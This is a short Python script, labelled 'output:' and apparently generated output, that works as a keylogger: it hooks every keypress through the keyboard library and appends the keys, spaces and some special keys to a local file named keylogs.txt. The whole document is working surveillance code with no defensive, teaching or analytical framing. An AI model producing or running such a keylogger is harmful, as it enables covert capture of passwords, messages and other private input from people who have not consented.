output:
import keyboard
def on_press(event):
    with open('keylogs.txt', 'a') as f:
        print(f'{event.name}')
        if event.name.isalnum():
            f.write(event.name)
        elif event.name == 'space':
            f.write(' ')
        elif event.name in ['enter', 'tab', 'shift']:  # Add more special keys as needed
            f.write(f'[{event.name.upper()}]')
keyboard.on_press(on_press)
keyboard.wait()
